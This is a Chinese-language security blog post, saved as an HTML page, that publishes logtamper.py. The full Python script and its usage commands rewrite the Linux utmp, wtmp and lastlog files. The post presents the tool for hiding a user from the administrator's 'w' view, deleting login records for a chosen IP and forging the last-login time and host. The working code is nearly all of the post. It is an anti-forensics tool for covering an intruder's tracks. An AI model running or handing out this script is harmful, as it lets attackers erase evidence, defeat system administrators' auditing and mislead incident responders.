@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&amp;nbsp;&amp;nbsp;经常用到xi4oyu大神的logtamper，非常之方便。但是有些场景下可能没条件编译、于是参照logtamper源码以及Intersect的源码写了个py版，参数和原版差不多。  躲避管理员w查看1python logtamper.py -m 1 -u b4dboy -i 192.168.0.188 清除指定ip的登录日志1python logtamper.py -m 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python修改linux日志(logtamper.py)">
+<meta property="og:url" content="http://secoff.net/archives/475.html">
+<meta property="og:site_name" content="Security Off">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;经常用到xi4oyu大神的logtamper，非常之方便。但是有些场景下可能没条件编译、于是参照logtamper源码以及Intersect的源码写了个py版，参数和原版差不多。  躲避管理员w查看1python logtamper.py -m 1 -u b4dboy -i 192.168.0.188 清除指定ip的登录日志1python logtamper.py -m 2">
+<meta property="og:updated_time" content="2017-08-02T02:32:13.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python修改linux日志(logtamper.py)">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;经常用到xi4oyu大神的logtamper，非常之方便。但是有些场景下可能没条件编译、于是参照logtamper源码以及Intersect的源码写了个py版，参数和原版差不多。  躲避管理员w查看1python logtamper.py -m 1 -u b4dboy -i 192.168.0.188 清除指定ip的登录日志1python logtamper.py -m 2">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    
+    <title>python修改linux日志(logtamper.py) | Security Off</title>
+    
+
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post" style="padding:40px;">
+<div id="nav" class="pull-right">
+  <ul>
+     <li class="icon">
+        <a href="javascript:history.go(-1)" title="Back"><i class="fa fa-mail-reply fa-5x"></i></a>
+     </li>
+  </ul>
+</div>
+  <!--
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  -->
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/archives/489.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/archives/461.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/475.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/475.html&text=python修改linux日志(logtamper.py)"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/475.html&is_video=false&description=python修改linux日志(logtamper.py)"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python修改linux日志(logtamper.py)&body=Check out this article: http://secoff.net/archives/475.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/475.html&name=python修改linux日志(logtamper.py)&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#躲避管理员w查看"><span class="toc-number">1.</span> <span class="toc-text">躲避管理员w查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清除指定ip的登录日志"><span class="toc-number">2.</span> <span class="toc-text">清除指定ip的登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改上次登录时间地点"><span class="toc-number">3.</span> <span class="toc-text">修改上次登录时间地点</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    
+    <div class="content index width mx-auto px2 my4" style="max-width:58rem">
+    
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        python修改linux日志(logtamper.py)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Security Off</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-09-02T10:44:12.000Z" itemprop="datePublished">2015-09-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>&nbsp;&nbsp;经常用到xi4oyu大神的logtamper，非常之方便。但是有些场景下可能没条件编译、于是参照logtamper源码以及Intersect的源码写了个py版，参数和原版差不多。</p>
+
+<h3 id="躲避管理员w查看"><a href="#躲避管理员w查看" class="headerlink" title="躲避管理员w查看"></a>躲避管理员w查看</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python logtamper.py -m 1 -u b4dboy -i 192.168.0.188</div></pre></td></tr></table></figure>
+<h3 id="清除指定ip的登录日志"><a href="#清除指定ip的登录日志" class="headerlink" title="清除指定ip的登录日志"></a>清除指定ip的登录日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python logtamper.py -m 2 -u b4dboy -i 192.168.0.188</div></pre></td></tr></table></figure>
+<h3 id="修改上次登录时间地点"><a href="#修改上次登录时间地点" class="headerlink" title="修改上次登录时间地点"></a>修改上次登录时间地点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2014:05:28:10:11:12</div></pre></td></tr></table></figure>
+<p>最后自己再确认下看有没有修改成功，可以使用chown、touch命令修改时间和使用者，程序代码如下：</p>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># mail: cn.b4dboy@gmail.com</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os, struct, sys</div><div class="line"><span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> strptime, mktime</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"></div><div class="line">UTMPFILE = <span class="string">"/var/run/utmp"</span></div><div class="line">WTMPFILE = <span class="string">"/var/log/wtmp"</span></div><div class="line">LASTLOGFILE = <span class="string">"/var/log/lastlog"</span></div><div class="line"></div><div class="line">LAST_STRUCT = <span class="string">'I32s256s'</span></div><div class="line">LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)</div><div class="line"></div><div class="line">XTMP_STRUCT = <span class="string">'hi32s4s32s256shhiii4i20x'</span></div><div class="line">XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getXtmp</span><span class="params">(filename, username, hostname)</span>:</span></div><div class="line">    xtmp = <span class="string">''</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'rb'</span>)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            bytes = fp.read(XTMP_STRUCT_SIZE)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> bytes:</div><div class="line">                <span class="keyword">break</span></div><div class="line"></div><div class="line">            data = struct.unpack(XTMP_STRUCT, bytes)</div><div class="line">            record = [(<span class="keyword">lambda</span> s: str(s).split(<span class="string">"\0"</span>, <span class="number">1</span>)[<span class="number">0</span>])(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</div><div class="line">            <span class="keyword">if</span> (record[<span class="number">4</span>] == username <span class="keyword">and</span> record[<span class="number">5</span>] == hostname):</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            xtmp += bytes</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Cannot open file: %s'</span> % filename)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line">    <span class="keyword">return</span> xtmp</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyLast</span><span class="params">(filename, username, hostname, ttyname, strtime)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        p = getpwnam(username)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'No such user.'</span>)</div><div class="line"></div><div class="line">    timestamp = <span class="number">0</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        str2time = strptime(strtime, <span class="string">'%Y:%m:%d:%H:%M:%S'</span>)</div><div class="line">        timestamp = int(mktime(str2time))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Time format err.'</span>)</div><div class="line"></div><div class="line">    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'wb'</span>)</div><div class="line">        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)</div><div class="line">        fp.write(data)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Cannot open file: %s'</span> % filename)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">showMessage</span><span class="params">(msg)</span>:</span></div><div class="line">    <span class="keyword">print</span> msg</div><div class="line">    exit(<span class="number">-1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span><span class="params">(filename, contents)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'w+b'</span>)</div><div class="line">        fp.write(contents)</div><div class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</div><div class="line">        showMessage(e)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    usage = <span class="string">'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \</span></div><div class="line">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'</div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">'-m'</span>, <span class="string">'--mode'</span>, dest=<span class="string">'MODE'</span>, default=<span class="string">'1'</span> , help=<span class="string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span>)</div><div class="line">    parser.add_option(<span class="string">'-t'</span>, <span class="string">'--ttyname'</span>, dest=<span class="string">'TTYNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--filename'</span>, dest=<span class="string">'FILENAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-u'</span>, <span class="string">'--username'</span>, dest=<span class="string">'USERNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-i'</span>, <span class="string">'--hostname'</span>, dest=<span class="string">'HOSTNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-d'</span>, <span class="string">'--dateline'</span>, dest=<span class="string">'DATELINE'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">3</span>:</div><div class="line">        <span class="keyword">if</span> options.MODE == <span class="string">'1'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = UTMPFILE</div><div class="line"></div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</div><div class="line">            saveFile(options.FILENAME, newData)</div><div class="line"></div><div class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">'2'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = WTMPFILE</div><div class="line"></div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</div><div class="line">            saveFile(options.FILENAME, newData)</div><div class="line"></div><div class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">'3'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.TTYNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.DATELINE == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = LASTLOGFILE</div><div class="line"></div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)</div><div class="line"></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            parser.print_help()</div></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#躲避管理员w查看"><span class="toc-number">1.</span> <span class="toc-text">躲避管理员w查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清除指定ip的登录日志"><span class="toc-number">2.</span> <span class="toc-text">清除指定ip的登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改上次登录时间地点"><span class="toc-number">3.</span> <span class="toc-text">修改上次登录时间地点</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/475.html"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/475.html&text=python修改linux日志(logtamper.py)"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/475.html&is_video=false&description=python修改linux日志(logtamper.py)"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python修改linux日志(logtamper.py)&body=Check out this article: http://secoff.net/archives/475.html"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/475.html&title=python修改linux日志(logtamper.py)"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/475.html&name=python修改linux日志(logtamper.py)&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    
+<div class="content index width mx-auto px2 my4" style="max-width:58rem">
+<footer id="footer" style="max-width:58rem">
+
+  <div class="footer-left">
+    Copyright &copy; 2017 b4dboy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
